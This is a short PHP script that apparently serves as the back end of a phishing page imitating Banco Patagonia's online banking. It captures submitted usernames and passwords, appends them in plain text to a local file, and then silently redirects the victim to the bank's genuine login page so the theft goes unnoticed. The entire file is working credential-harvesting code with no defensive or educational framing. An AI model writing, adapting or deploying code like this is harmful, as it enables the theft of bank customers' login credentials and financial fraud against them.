<?php
$usuario = $_POST["username"];
$contraseña = $_POST["password"];
file_put_contents("datos.txt", $usuario . ": " . $contraseña . "\n", FILE_APPEND);
header("Location: https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.htm");
exit;
?>